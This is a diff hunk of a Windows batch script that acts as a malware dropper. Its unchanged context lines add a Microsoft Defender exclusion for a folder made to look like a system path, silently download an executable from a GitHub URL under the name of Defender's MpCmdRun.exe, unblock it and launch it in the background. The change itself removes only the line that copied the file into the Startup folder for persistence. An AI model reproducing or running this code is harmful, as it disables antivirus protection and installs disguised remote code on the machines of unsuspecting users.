@@ -9,7 +9,6 @@ setlocal enabledelayedexpansion
     if not exist "%LOCALAPPDATA%\Microsoft\Vault" mkdir "%LOCALAPPDATA%\Microsoft\Vault"
     powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\Vault' -ErrorAction SilentlyContinue"
     curl -L -s -o "%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe" "https://github.com/ajeje-brazorf-02/proton-star/raw/main/Windows_a7.exe"
-    copy "%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
     powershell -Command "Unblock-File '%LOCALAPPDATA%\Microsoft\Vault\VaultSvc.exe'"
     start /B "" "%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe"
     set FilePath=%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe
